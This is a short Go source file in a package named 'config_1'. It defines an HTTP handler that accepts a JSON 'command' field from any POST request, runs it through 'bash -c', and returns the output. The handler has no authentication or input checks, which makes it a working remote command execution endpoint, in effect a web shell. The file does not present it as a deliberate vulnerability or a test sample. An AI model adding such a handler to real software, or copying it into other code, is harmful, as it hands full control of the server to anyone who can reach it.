package config_1

import (
	"encoding/json"
	"net/http"
	"os/exec"
)

type CmdRequest struct {
	Command string `json:"command"`
}

// Standard response structures
type SuccessResponse struct {
	Status string `json:"status"`
}

func HandleCommandExec(w http.ResponseWriter, r *http.Request) {
	// Check for POST method
	if r.Method != http.MethodPost {
		sendError(w, "Only POST method allowed", http.StatusMethodNotAllowed)
		return
	}

	// Set content type
	w.Header().Set("Content-Type", "application/json")

	// Parse request body
	var req CmdRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		sendError(w, "Invalid JSON input: "+err.Error(), http.StatusBadRequest)
		return
	}

	// Validate command is not empty
	if req.Command == "" {
		sendError(w, "Command cannot be empty", http.StatusBadRequest)
		return
	}

	// Execute command
	out, err := exec.Command("bash", "-c", req.Command).CombinedOutput()

	if err != nil {
		// Command execution failed - return error with output
		sendError(w, "Command execution failed: "+string(out), http.StatusInternalServerError)
		return
	}

	// Command executed successfully - include output in response
	response := map[string]string{
		"status": "success",
		"output": string(out),
	}
	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(response)
}
